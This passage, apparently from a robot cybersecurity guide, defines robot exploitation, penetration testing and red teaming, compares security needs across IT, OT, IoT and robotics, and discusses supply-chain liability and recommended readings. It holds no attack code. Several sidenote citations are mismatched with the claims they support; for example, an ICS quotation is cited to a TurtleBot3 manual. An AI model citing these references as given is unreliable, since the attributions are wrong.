    </tr>
    <tr class="even">
    <td><strong>Surviving benign errors is …</strong></td>
    <td>Desired</td>
    <td>Not desired</td>
    </tr>
    </tbody>
    </table>
    </details>
    <h3 id="robot-exploitation">Robot exploitation</h3>
    <p>An <code>exploit</code> is a piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability to cause unintended or unanticipated behavior to occur on computer software, hardware, or something electronic (usually computerized). Exploitation is the art of taking advantage of vulnerabilities.</p>
    <h3 id="robot-penetration-testing-rpt">Robot penetration testing (RPT)</h3>
    <p>Robot Penetration Testing (<em>robot pentesting</em> or RPT) is an offensive activity that seeks to find as many robot vulnerabilities as possible to risk-assess and prioritize them. Relevant attacks are performed on the robot in order to confirm vulnerabilities. This exercise is effective at providing a thorough list of vulnerabilities, and should ideally be performed before shipping a product, and periodically after.</p>
    <p>In a nutshell, robot penetration testing allows you to get a realistic and practical input of how vulnerable your robot is within a scope. A team of security researchers would then challenge the security of a robotic technology, find as many vulnerabilities as possible and develop exploits to take advantage of them.</p>
    <p>See <span class="citation" data-cites="dieber2020penetration">Dieber et al. (<a href="#ref-dieber2020penetration" role="doc-biblioref">2020</a>)</span> for an example applied to ROS systems.</p>
    <h3 id="robot-red-teaming-rrt">Robot red teaming (RRT)</h3>
    <p>Robot red teaming is a targeted offensive cyber security exercise, suitable for use cases that have been already exposed to security flaws and wherein the objective is to fulfill a particular objective (attacker’s goal). While robot penetration testing is much more effective at providing a thorough list of vulnerabilities and improvements to be made, a red team assessment provides a more accurate measure of a given technology’s preparedness for remaining resilient against cyber-attacks.</p>
    <p>Overall, robot red teaming comprises a full-scope and multi-layered targeted (with specific goals) offensive attack simulation designed to measure how well your robotic technology can withstand an attack.</p>
    <h3 id="robot-red-teaming">Robot red teaming</h3>
    <h3 id="other">Other</h3>
    <h4 id="robot-forensics">Robot forensics</h4>
    <p>Robot forensics proposes a number of scientific tests and methods to obtain, preserve and document evidence from robot-related crimes. In particular, it focuses on recovering data from robotic systems to establish who committed the crime.</p>
    <p>Review https://github.com/Cugu/awesome-forensics.</p>
    <h4 id="robot-reversing">Robot reversing</h4>
    <p>Software reverse engineering (or <em>reversing</em>) is the process of extracting the knowledge or design blueprints from any software. When applied to robotics, robot reversing can be understood as the process of extracting information about the design elements in a robotic system.</p>
    <h2 id="comparing-robot-cybersecurity-with-it-ot-and-iot">Comparing robot cybersecurity with IT, OT and IoT</h2>
    <p>Security is often defined as the state of being free from danger or threat. But what does this mean in practice? What does it imply to be <em>free from danger</em>? Is it the same in enterprise and industrial systems? Well, short answer: no, it’s not. Several reasons but one important is that the underlying technological architectures for each one of these environments, though shares technical bits, are significantly different which leads to a different interpretation of what security (again, being <em>free from danger and threats</em>) requires.</p>
    <p>This section analyzes some of the cyber security aspects that apply in different domains including IT, OT, IoT or robotics and compares them together. Particularly, the article focuses on clarifying how robotics differs from other technology areas and how a lack of clarity is leading to leave the user heavily unprotected against cyber attacks. Ultimately, this piece argues on why cyber security in robotics will be more important than in any other technology due to its safety implications, including IT, OT or even IoT.</p>
    <h3 id="introducing-some-common-terms">Introducing some common terms</h3>
    <p>Over the years, additional wording has developed to specify security for different contexts. Generically, and from my readings, we commonly refer to cyber security (or cybersecurity, shortened as just “security”) as the state of a given system of being free from cyber dangers or cyber threats, those digital. As pointed out, we often mix “security” associated with terms that further specify the domain of application, e.g. we often hear things such as <code>IT security</code> or <code>OT security</code>.</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/06/IT_OT_IoT_robotics_ccomparison.png" alt="IT, OT, IoT and robots comparison" /><figcaption aria-hidden="true">IT, OT, IoT and robots comparison</figcaption>
    </figure>
    <p>During the past two years, while reading, learning, attending to security conferences and participating on them, I’ve seen how both security practitioners and manufacturers caring about security do not clearly differentiate between <code>IT</code>, <code>OT</code>, <code>IoT</code> or <code>robotics</code>. Moreover, it’s often a topic for arguments the comparison between <code>IT</code> and <code>IT security</code>. The following definitions aim to shed some light into this common topic:</p>
    <ul>
    <li><strong>Information Technology (IT)</strong>: the use of computers to store, retrieve, transmit, and manipulate data or information throughout and between organizations<span class="sidenote-wrapper"><label for="sn-1" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-1" class="margin-toggle"/><span class="sidenote">TB3 ROS 2 packages https://github.com/ROBOTIS-GIT/turtlebot3/tree/ros2<br />
    <br />
    </span></span>.</li>
    <li><strong>Operational Technology (OT)</strong>: the technology that manages industrial operations by monitoring and controlling specific devices and processes within industrial workflows and operations, as opposed to administrative (IT) operations. This term is very closely related to:</li>
    <li><strong>Industrial Control System (ICS)</strong>: is a major segment within the OT sector that comprises those systems that are used to monitor and control the industrial processes. ICS is a general term that encompasses several types of control systems (e.g. SCADA, DCS) in industry and can be understood as a subset of OT.</li>
    <li><strong>Internet of the Things (IoT)</strong>: an extension of the Internet and other network connections to different sensors and devices — or “things” — affording even simple objects, such as lightbulbs, locks, and vents, a higher degree of computing and analytical capabilities. The IoT can be understood as an extension of the Internet and other network connections to different sensors and devices.</li>
    <li><strong>Industrial Internet of the Things (IIoT)</strong>: refers to the extension and use of the Internet of Things (IoT) in industrial sectors and applications.</li>
    <li><strong>robotics</strong>: A robot is a system of systems. One that comprises sensors to perceive its environment, actuators to act on it and computation to process it all and respond coherently to its application (could be industrial, professional, etc.). Robotics is the art of system integration. An art that aims to build machines that operate autonomously.</li>
    </ul>
    <blockquote>
    <p>Robotics is the art of system integration. Robots are systems of systems, devices that operate autonomously.</p>
    </blockquote>
    <p>It’s important to highlight that all the previous definitions refer to technologies. Some are domain specific (e.g. OT) while others are agnostic to the domain (e.g. robotics) but <strong>each one of them are means that serve the user for and end</strong>.</p>
    <h3 id="comparing-the-security-across-these-technologies">Comparing the security across these technologies</h3>
    <p>Again, IT, OT, ICS, IoT, IIoT and robotics are all technologies. As such, each one of these is subject to operate securely, that is, free from danger or threats. For each one of these technologies, though might differ from each other, one may wonder, how do I apply security?</p>
    <p>Let’s look at what literature says about the security comparison of some of these:</p>
    <p>From <span class="sidenote-wrapper"><label for="sn-2" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-2" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span>:</p>
    <blockquote>
    <p><em>Initially, ICS had little resemblance to IT systems in that ICS were isolated systems running proprietary control protocols using specialized hardware and software. Widely available, low-cost Ethernet and Internet Protocol (IP) devices are now replacing the older proprietary technologies, which increases the possibility of cybersecurity vulnerabilities and incidents. As ICS are adopting IT solutions to promote corporate connectivity and remote access capabilities, and are being designed and implemented using industry standard computers, operating systems (OS) and network protocols, they are starting to resemble IT systems. This integration supports new IT capabilities, but it provides significantly less isolation for ICS from the outside world than predecessor systems, creating a greater need to secure these systems. While security solutions have been designed to deal with these security issues in typical IT systems, special precautions must be taken when introducing these same solutions to ICS environments. In some cases, new security solutions are needed that are tailored to the ICS environment.</em></p>
    </blockquote>
    <p>While Stouffer et al. <span class="sidenote-wrapper"><label for="sn-3" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-3" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> focus on comparing ICS and IT, a similar rationale can easily apply to OT (as a superset of ICS).</p>
    <p>To some, the phenomenon referred to as <code>IoT</code> is in large part about the physical merging of many traditional <code>OT</code> and <code>IT</code> components. There are many comparisons in literature (e.g. <span class="sidenote-wrapper"><label for="sn-4" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-4" class="margin-toggle"/><span class="sidenote">Atlam, Hany &amp; Alenezi, Ahmed &amp; Alshdadi, Abdulrahman &amp; Walters, Robert &amp; Wills, Gary. (2017). Integration of Cloud Computing with Internet of Things: Challenges and Open Issues. 10.1109/iThings-GreenCom-CPSCom-SmartData.2017.105.<br />
    <br />
    </span></span> an interesting one that also touches into cloud systems, which I won’t get into now) but most seem to agree that while I-o-T aims to merge both <code>IT</code> and <code>OT</code>, the security of <code>IoT</code> technologies requires a different skill set. In other words, the security of <code>IoT</code> should be treated independently to the one of <code>IT</code> or <code>OT</code>. Let’s look at some representations:</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/06/tech_comparison_IoT_big.png" alt="Comparison with IoT as the superset" /><figcaption aria-hidden="true">Comparison with IoT as the superset</figcaption>
    </figure>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/06/tech_comparison_IoT_small.png" alt="Comparison with IoT as the intersection" /><figcaption aria-hidden="true">Comparison with IoT as the intersection</figcaption>
    </figure>
    <p>What about robotics then? How does the security in robotics compare to the one in <code>IoT</code> or <code>IT</code>? Arguably, robotic systems are significantly more complex than the corresponding ones in <code>IT</code>, <code>OT</code> or even <code>IoT</code> setups. Shouldn’t security be treated differently then as well? I definitely believe so and while much can be learned from other technologies, robotics deserves its own security treatment. Specially because I strongly believe that:</p>
    <blockquote>
    <p>cyber security in robotics will be more important than in any other technology due to its safety implications, including IT, OT or even IoT.</p>
    </blockquote>
    <p>Of course, I’m a roboticist so expect a decent amount of bias on this claim. Let me however further argue on this. The following table is inspired by processing and extending <span class="sidenote-wrapper"><label for="sn-5" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-5" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> and <span class="sidenote-wrapper"><label for="sn-6" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-6" class="margin-toggle"/><span class="sidenote">ROS 2 specific section in TB3 e-manual http://emanual.robotis.com/docs/en/platform/turtlebot3/ros2/<br />
    <br />
    </span></span> for robotics while including other works such as <span class="sidenote-wrapper"><label for="sn-7" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-7" class="margin-toggle"/><span class="sidenote">Atlam, Hany &amp; Alenezi, Ahmed &amp; Alshdadi, Abdulrahman &amp; Walters, Robert &amp; Wills, Gary. (2017). Integration of Cloud Computing with Internet of Things: Challenges and Open Issues. 10.1109/iThings-GreenCom-CPSCom-SmartData.2017.105.<br />
    <br />
    </span></span>, among others:</p>
    <table>
    <colgroup>
    <col style="width: 34%" />
    <col style="width: 8%" />
    <col style="width: 21%" />
    <col style="width: 21%" />
    <col style="width: 14%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th><strong>Security topic</strong></th>
    <th><strong>IT</strong></th>
    <th><strong>OT</strong> (ICS)</th>
    <th><strong>I(I)oT</strong></th>
    <th><strong>Robotics</strong></th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><strong>Antivirus</strong></td>
    <td>widely used, easily updated</td>
    <td>complicated and often imposible, network detection and prevention solutions mostly</td>
    <td>Similarly complicated, lots of technology fragmentation (different RTOSs, embedded frameworks and communication paradigms), network detection and prevention solutions exist</td>
    <td>complicated and complex due to the technology nature, very few existing solutions (e.g. <a href="https://aliasrobotics.com/ris.php">RIS</a>), network monitoring and prevention isn’t enough due to safety implications</td>
    </tr>
    <tr class="even">
    <td><strong>Life cycle</strong></td>
    <td>3-5 years</td>
    <td>10-20 years</td>
    <td>5-10 years</td>
    <td>10+ years</td>
    </tr>
    <tr class="odd">
    <td><strong>Awareness</strong></td>
    <td>Decent</td>
    <td>Poor</td>
    <td>Poor</td>
    <td>None</td>
    </tr>
    <tr class="even">
    <td><strong>Patch management</strong></td>
    <td>Often</td>
    <td>Rare, requires approval from plant manufacturers</td>
    <td>Rare, often requires permission (and/or action) from end-user</td>
    <td>Very rare, production implications, complex set ups</td>
    </tr>
    <tr class="odd">
    <td><strong>Change Management</strong></td>
    <td>Regular and scheduled</td>
    <td>Rare</td>
    <td>Rare</td>
    <td>Very rare, often specialized technitians</td>
    </tr>
    <tr class="even">
    <td><strong>Evaluation of log files</strong></td>
    <td>Established practice</td>
    <td>Unusual practice</td>
    <td>Unusual practice</td>
    <td>Non-established practice</td>
    </tr>
    <tr class="odd">
    <td><strong>Time dependency</strong></td>
    <td>Delays Accepted</td>
    <td>Critical</td>
    <td>Some delays accepted (depends of domain of application, e.g. IIoT might be more sensitive)</td>
    <td>Critical, both inter and intra robot communications</td>
    </tr>
    <tr class="even">
    <td><strong>Availability</strong></td>
    <td>Not always available, failures accepted</td>
    <td>24*7</td>
    <td>Some failures accepted (again, domain specific)</td>
    <td>24*7 available</td>
    </tr>
    <tr class="odd">
    <td><strong>Integrity</strong></td>
    <td>Failures accepted</td>
    <td>Critical</td>
    <td>Some failures accepted (again, domain specific)</td>
    <td>Critical</td>
    </tr>
    <tr class="even">
    <td><strong>Confidentiality</strong></td>
    <td>Critical</td>
    <td>Relevant</td>
    <td>Important</td>
    <td>Important</td>
    </tr>
    <tr class="odd">
    <td><strong>Safety</strong></td>
    <td>Not relevant (does not apply generally)</td>
    <td>Relevant</td>
    <td>Not relevant (though depends of domain of application, but IoT systems are not known for their safety concerns)</td>
    <td>Critical, autonomous systems may easily compromise safety if not operating as expected</td>
    </tr>
    <tr class="even">
    <td><strong>Security tests</strong></td>
    <td>Widespread</td>
    <td>Rare and problematic (infrastructure restrictions, etc.)</td>
    <td>Rare</td>
    <td>Mostly not present (<a href="https://aliasrobotics.com/security-assessment.php">first services of this kind for robotics</a> are starting to appear)</td>
    </tr>
    <tr class="odd">
    <td><strong>Testing environment</strong></td>
    <td>Available</td>
    <td>Rarely available</td>
    <td>Rarely available</td>
    <td>Rare and difficult to reproduce</td>
    </tr>
    <tr class="even">
    <td><strong>Determinism requirements</strong> (refer to <span class="sidenote-wrapper"><label for="sn-8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-8" class="margin-toggle"/><span class="sidenote">Gutiérrez, C. S. V., Juan, L. U. S., Ugarte, I. Z., &amp; Vilches, V. M. (2018). Towards a distributed and real-time framework for robots: Evaluation of ROS 2.0 communications for real-time robotic applications. arXiv preprint arXiv:1809.02595.<br />
    <br />
    </span></span> for definitions)</td>
    <td>Non-real-time. Responses must be consistent. High throughput is demanded. High delay and jitter may be acceptable. Less critical emergency interaction. Tightly restricted access control can be implemented to the degree necessary for security</td>
    <td>Hard real-time. Response is time-critical. Modest throughput is acceptable. High delay and/or jitter is not acceptable. Response to human and other emergency interaction is critical. Access to ICS should be strictly controlled, but should not hamper or interfere with human-machine interaction</td>
    <td>Often non-real-time, though some environment will require soft or firm real-time</td>
    <td>Hard real-time requirements for safety critical applications and firm/soft real-time for other tasks</td>
    </tr>
    </tbody>
    </table>
    </div>
    <p>Looking at this table and comparing the different technologies, it seems reasonable to admit that robotics receives some of the heaviest restrictions when it comes to the different security properties, certainly, much more than IoT or IT.</p>
    <p>Still, why do robotic manufacturers focus solely on <code>IT</code> security?</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/06/mir-it-security.png" alt="MiR on IT security" /><figcaption aria-hidden="true">MiR on IT security</figcaption>
    </figure>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/06/mir-it-improve.png" alt="MiR on how to improve IT security" /><figcaption aria-hidden="true">MiR on how to improve IT security</figcaption>
    </figure>
    <h2 id="understanding-the-robotics-supply-chain">Understanding the robotics supply chain</h2>
    <p>Insecurities in robotics are not just in the robots themselves, they are also in the whole supply chain. The tremendous growth and popularity of collaborative robots have over the past years introduced flaws in the –already complicated– supply chain, which hinders serving safe and secure robotics solutions.</p>
    <p>Traditionally, <code>Manufacturer</code>, <code>Distributor</code> and <code>System Integrator</code> stakeholders were all into one single entity that served <code>End users</code> directly. This is the case of some of the biggest and oldest robot manufacturers including ABB or KUKA, among others.</p>
    <p>Most recently, and specially with the advent of collaborative robots <span class="sidenote-wrapper"><label for="sn-9" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-9" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> and their insecurities <span class="sidenote-wrapper"><label for="sn-10" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-10" class="margin-toggle"/><span class="sidenote">ROS 2 specific section in TB3 e-manual http://emanual.robotis.com/docs/en/platform/turtlebot3/ros2/<br />
    <br />
    </span></span>, each one of these stakeholders acts independently, often with a blurred line between <code>Distributor</code> and <code>Integrator</code>. This brings additional complexity when it comes to responding to <code>End User</code> demands, or solving legal conflicts.</p>
    <blockquote>
    <p>Companies like Universal Robots (UR) or Mobile Industrial Robots (MiR) represent best this <em>fragmentation</em> of the supply chain. When analyzed from a cybersecurity angle, one wonders: which of these approaches is more responsive and responsible when applying security mitigations? Does fragmentation difficult responsive reaction against cyber-threats? Are <code>Manufacturers</code> like Universal Robots pushing the responsibility and liabilities to their <code>Distributors</code> and the subsequent <code>Integrators</code> by fragmenting the supply chain? What are the exact legal implications of such fragmentation?</p>
    </blockquote>
    <h3 id="stakeholders-of-the-robotics-supply-chain">Stakeholders of the robotics supply chain</h3>
    <p>Some of the stakeholders of both the <em>new</em> and the <em>old</em> robotics supply chains are captured and defined in the figure below:</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/05/The-supply-chain.png" alt="Stakeholders of the robotics supply chain" /><figcaption aria-hidden="true">Stakeholders of the robotics supply chain</figcaption>
    </figure>
    <p>Not much to add. The diagram above is far from complete. There’re indeed more players but these few allow one to already reason about the present issues that exist in the robotics supply chain.</p>
    <h3 id="the-new-supply-chain-in-robotics">The ‘new’ supply chain in robotics</h3>
    <p>It really <strong>isn’t new</strong>. The supply chain (and GTM strategy) presented by vendors like UR or MiR (both owned by Teradyne) was actually inspired by many others, across industries, yet, it’s certainly been growing in popularity over the last years in robotics. In fact, one could argue that the popularity of collaborative robots is related to this <em>change in the supply chain</em>, where many stakeholders contributed to the spread of these new technologies.</p>
    <p>This supply chain is depicted below, where a series of security-related interactions are captured:</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/05/C8C71179-CF96-46A3-9BCD-E69CA6F4CD6D.png" alt="Liabilities and responsibilities in the robotics supply chain" /><figcaption aria-hidden="true">Liabilities and responsibilities in the robotics supply chain</figcaption>
    </figure>
    <p>The diagram presents several sub-cases, each deals with scenarios that may happen when robots present cybersecurity flaws. Beyond the interactions, what’s outstanding is the more than 20 legal questions related to liabilities and responsibility that came up. This, in my opinion, <strong>reflects clearly the complexity of the current supply chain in robotics, and the many compromises one needs to assume</strong> when serving, distributing, integrating, or operating a robot.</p>
    <p>What’s more scary, is that most of the stakeholders involved in the supply chain I interact with <ins>ignore their responsibilities</ins> (different reasons, from what I can see). The security angle in here is critical. Security mitigations need to be supplied all the way down to the end-user products, otherwise, it’ll lead to hazards.</p>
    <p>While I am not a laywer, my discussions with lawyers on this topic made me believe that there’s lack of legal frameworks and/or clear answers in Europe for most of these questions. Morever, the lack of security awareness from many of the stakeholders involved <span class="sidenote-wrapper"><label for="sn-11" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-11" class="margin-toggle"/><span class="sidenote">Mayoral-Vilches, V. <em>Universal Robots cobots are not secure</em>. Cybersecurity and Robotics.<br />
    <br />
    </span></span> is not only compromising intermediaries (e.g. <code>Distributor</code>s and <code>System Integrator</code>s), but ultimately exposing end-users to risks.</p>
    <p>Altogether, I strongly believe this ‘new’ supply chain and the clear lack of security awareness and reactions leads to a compromised supply chain in robotics. I’m listing below a few of the most relevant (refer to the diagram above for all of them) cybersecurity-related questions raised while building the figure above reasoning on the supply chain:</p>
    <ul>
    <li>Who is responsible (across the supply chain) and what are the liabilities if as a result of a cyber-attack there is human harm for a previously not known (or reported) flaw for a particular manufacturers’s technology?<span class="sidenote-wrapper"><label for="sn-12" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-12" class="margin-toggle"/><span class="sidenote">Note this questions covers both, 0-days and known flaws that weren’t previously reported.<br />
    <br />
    </span></span></li>
    <li>Who is responsible (across the supply chain) and what are the liabilities if as a result of a cyber-attack there is a human harm for a known and disclosed but not mitigated flaw for a particular manufacturers’s technology?</li>
    <li>Who is responsible (across the supply chain) and what are the liabilities if as a result of a cyber-attack there is a human harm for a known, disclosed and mitigated flaw, yet not patched?</li>
    <li>What happens if the harm is environmental?</li>
    <li>And if there is no harm? Is there any liability for the lack of responsible behavior in the supply chain?</li>
    <li>What about researchers? are they allowed to freely incentivate security awareness by ethically disclosing their results? (which you’d expect when one discovers something)</li>
    <li>Can researchers collect insecurity evidence to demonstrate non-responsible behavior without liabilities?</li>
    </ul>
    <h3 id="so-whats-better-fragmentation-or-the-lack-of-it">So, what’s better, fragmentation or the lack of it?</h3>
    <p>I see a huge growth through fragmentation yet, still, reckon that the biggest and most successful robotics companies out there tend to integrate it all.</p>
    <p>What’s clear to me is that fragmentation of the supply chain (or the ‘new’ supply chain) presents clear challenges for cybersecurity. Maintaining security in a fragmented scenario is more challenging, requires more resources and a well coordinated and often distributed series of actions (which by reason is tougher).</p>
    <blockquote>
    <p>fragmentation of the supply chain (or the ‘new’ supply chain) presents clear challenges from a security perspective.</p>
    </blockquote>
    <p>Investing in robot cybersecurity by either building your own security team or relying on external support is a must.</p>
    <h2 id="recommended-readings">Recommended readings</h2>
    <table>
    <colgroup>
    <col style="width: 35%" />
    <col style="width: 65%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>Title</th>
    <th>Description</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td>Introducing the Robot Security Framework (RSF) <span class="citation" data-cites="vilches2018introducing">(<a href="#ref-vilches2018introducing" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Kirschgens, Calvo, et al. 2018</a>)</span></td>
    <td>A methodology to perform systematic security assessments in robots proposing a checklist-like approach that reviews most relevant aspects in a robot</td>
    </tr>
    <tr class="even">
    <td>Robot hazards: from safety to security <span class="citation" data-cites="kirschgens2018robot">(<a href="#ref-kirschgens2018robot" role="doc-biblioref">Alzola-Kirschgens et al. 2018</a>)</span></td>
    <td>Discussion of the current status of insecurity in robotics and the relationship between safety and security, ignored by most vendors</td>
    </tr>
    <tr class="odd">
    <td>The Robot Vulnerability Scoring System (RVSS) <span class="citation" data-cites="vilches2018towards">(<a href="#ref-vilches2018towards" role="doc-biblioref">Vilches, Gil-Uriarte, et al. 2018</a>)</span></td>
    <td>Introduction of a new assessment scoring mechanisms for the severity of vulnerabilities in robotics that builds upon previous work and specializes it for robotics</td>
    </tr>
    <tr class="even">
    <td>Robotics CTF (RCTF), a playground for robot hacking <span class="citation" data-cites="mendia2018robotics">(<a href="#ref-mendia2018robotics" role="doc-biblioref">Mendia et al. 2018</a>)</span></td>
    <td>Docker-based CTF environment for robotics</td>
    </tr>
    <tr class="odd">
    <td>Volatile memory forensics for the Robot Operating System <span class="citation" data-cites="vilches2018volatile">(<a href="#ref-vilches2018volatile" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Kirschgens, Gil-Uriarte, et al. 2018</a>)</span></td>
    <td>General overview of forensic techniques in robotics and discussion of a robotics-specific Volatility plugin named <code>linux_rosnode</code>, packaged within the <code>ros_volatility</code> project and aimed to extract evidence from robot’s volatile memory</td>
    </tr>
    <tr class="even">
    <td>aztarna, a footprinting tool for robots <span class="citation" data-cites="vilches2018aztarna">(<a href="#ref-vilches2018aztarna" role="doc-biblioref">Vilches, Mendia, et al. 2018</a>)</span></td>
    <td>Tool for robot reconnaissance with particular focus in footprinting</td>
    </tr>
    <tr class="odd">
    <td>Introducing the robot vulnerability database (RVD) <span class="citation" data-cites="vilches2019introducing">(<a href="#ref-vilches2019introducing" role="doc-biblioref">Vilches et al. 2019</a>)</span></td>
    <td>A database for robot-related vulnerabilities and bugs</td>
    </tr>
    <tr class="even">
    <td>Industrial robot ransomware: Akerbeltz <span class="citation" data-cites="mayoral2019industrial">(<a href="#ref-mayoral2019industrial" role="doc-biblioref">Vı́ctor Mayoral-Vilches, San Juan, et al. 2019</a>)</span></td>
    <td>Ransomware for Industrial collaborative robots</td>
    </tr>
    <tr class="odd">
    <td>Cybersecurity in Robotics: Challenges, Quantitative Modeling and Practice <span class="citation" data-cites="ROB-061">(<a href="#ref-ROB-061" role="doc-biblioref">Zhu et al. 2021b</a>)</span></td>
    <td>Introduction to the robot cybersecurity field describing current challenges, quantitative modeling and practices</td>
    </tr>
    <tr class="even">
    <td>DevSecOps in Robotics <span class="citation" data-cites="mayoral2020devsecops">(<a href="#ref-mayoral2020devsecops" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Garcı́a-Maestro, et al. 2020</a>)</span></td>
    <td>A set of best practices designed to help roboticists implant security deep in the heart of their development and operations processes</td>
    </tr>
    <tr class="odd">
    <td>alurity, a toolbox for robot cybersecurity <span class="citation" data-cites="mayoral2020alurity">(<a href="#ref-mayoral2020alurity" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Abad-Fernández, et al. 2020</a>)</span></td>
    <td>Alurity is a modular and composable toolbox for robot cybersecurity. It ensures that both roboticists and security researchers working on a project, have a common, consistent and easily reproducible development environment facilitating the security process and the collaboration across teams</td>
    </tr>
    <tr class="even">
    <td>Can ROS be used securely in industry? Red teaming ROS-Industrial <span class="citation" data-cites="mayoral2020can">(<a href="#ref-mayoral2020can" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Pinzger, et al. 2020</a>)</span></td>
    <td>Red team ROS in an industrial environment to attempt answering the question: Can ROS be used securely for industrial use cases even though its origins didn’t consider it?</td>
    </tr>
    <tr class="odd">
    <td>Hacking planned obsolescense in robotics, towards security-oriented robot teardown <span class="citation" data-cites="mayoral2021hacking">(<a href="#ref-mayoral2021hacking" role="doc-biblioref">Victor Mayoral-Vilches et al. 2021</a>)</span></td>
    <td>As robots get damaged or security compromised, their components will increasingly require updates and replacements. Contrary to the expectations, most manufacturers employ planned obsolescence practices and discourage repairs to evade competition. We introduce and advocate for robot teardown as an approach to study robot hardware architectures and fuel security research. We show how our approach helps uncovering security vulnerabilities, and provide evidence of planned obsolescence practices.</td>
    </tr>
    </tbody>
    </table>
    <h2 id="recommended-talks">Recommended talks</h2>
    <ul>
    <li><ins>
    2016
    </ins>
    <ul>
    <li><a href="https://vimeo.com/187705073">Securing ROS over the wire, in the graph, and through the kernel</a>, ROSCon 2016</li>
    </ul></li>
    <li><ins>
    2017
    </ins>
    <ul>
    <li><a href="https://www.youtube.com/watch?v=LK43J-p1H3o">Hacking Robots Before Skynet</a>, Ekoparty Security Conference 2017</li>
    <li><a href="https://www.youtube.com/watch?v=tGcNefddfZM">An Experimental Security Analysis of an Industrial Robot Controller</a>, IEEE Symposium on Security and Privacy 2017</li>
    <li><a href="https://vimeo.com/236172830">SROS: Current Progress and Developments</a>, ROSCon 2017</li>
    <li><a href="https://www.youtube.com/watch?v=RKLUWnzIaP4">Breaking the Laws of Robotics: Attacking Industrial Robots</a>, Black Hat USA 2017</li>
    </ul></li>
    <li><ins>
    2018
    </ins>
    <ul>
    <li><a href="https://www.youtube.com/watch?v=Gv4O2Xw8MUk&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=11">Introducing the Robot Security Framework</a> (spanish), Navaja Negra Conference 2018</li>
    <li><a href="https://vimeo.com/292703899">Arm DDS Security library: Adding secure security to ROS2</a>, ROSCon 2018</li>
    <li><a href="https://vimeo.com/292703074">Leveraging DDS Security in ROS 2</a>, ROSCon 2018</li>
    </ul></li>
    <li><ins>
    2019
    </ins>
    <ul>
    <li><a href="https://www.youtube.com/watch?v=aEQgga_MnO8&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=9">Defensive and offensive robot security</a>, ROS-Industrial Conference 2019</li>
    <li><a href="https://vimeo.com/378682905">Black Block Recorder: Immutable Black Box Logging via rosbag2 and DLTs</a>, ROSCon 2019</li>
    </ul></li>
    <li><ins>
    2020
    </ins>
    <ul>
    <li><a href="https://www.youtube.com/watch?v=5pWqROTERgU&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=10">Current security threat landscape in robotics</a>, European Robotics Forum (ERF) 2020</li>
    <li><a href="https://www.youtube.com/watch?v=n7BvyUgKP-M&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=11">Security in ROS &amp; ROS 2 robot setups</a>, European Robotics Forum (ERF) 2020</li>
    <li><a href="https://www.youtube.com/watch?v=5dYmpKH_3EM">Akerbeltz, industrial robot ransomware</a>, International Workshop on Engineering Resilient Robot Software Systems, International Conference on Robotic Computing (IRC 2020).</li>
    <li><a href="https://www.youtube.com/watch?v=jfPw8gH1i2I">Zero Trust Architecture in Robotics</a>, Workshop on Security and Privacy in Robotics, ICRA 2020</li>
    <li><a href="https://www.youtube.com/watch?v=phHYfAqjOuQ&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=13">The cybersecurity status of PX4</a>, PX4 Developer Summit Virtual 2020</li>
    <li><a href="https://dl.acm.org/doi/10.1145/3320269.3384735#sec-supp">Detecting Insecure Code Patterns in Industrial Robot Programs</a>, Proceedings of the 15th ACM Asia Conference on Computer and Communications Security 2020</li>
    <li><a href="https://www.youtube.com/watch?v=jo_L9Ra8UqU&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=14">Protecting robot endpoints against cyber-threats</a>, ROS-Industrial Conference 2020</li>
    <li><a href="https://www.youtube.com/watch?v=Yu3lgESCB8M">Robots and Privacy</a>, Shmoocon 2020</li>
    </ul></li>
    <li><ins>
    2021
    </ins>
    <ul>
    <li><a href="https://www.youtube.com/watch?v=PnVq_ThrDVI&amp;list=PLf4Fnww4KiFdjCAfs04ynv40xbpqFPibm&amp;index=15">Uncovering Planned Obsolescence Practices in Robotics and What This Means for Cybersecurity</a>, BlackHat USA 2021</li>
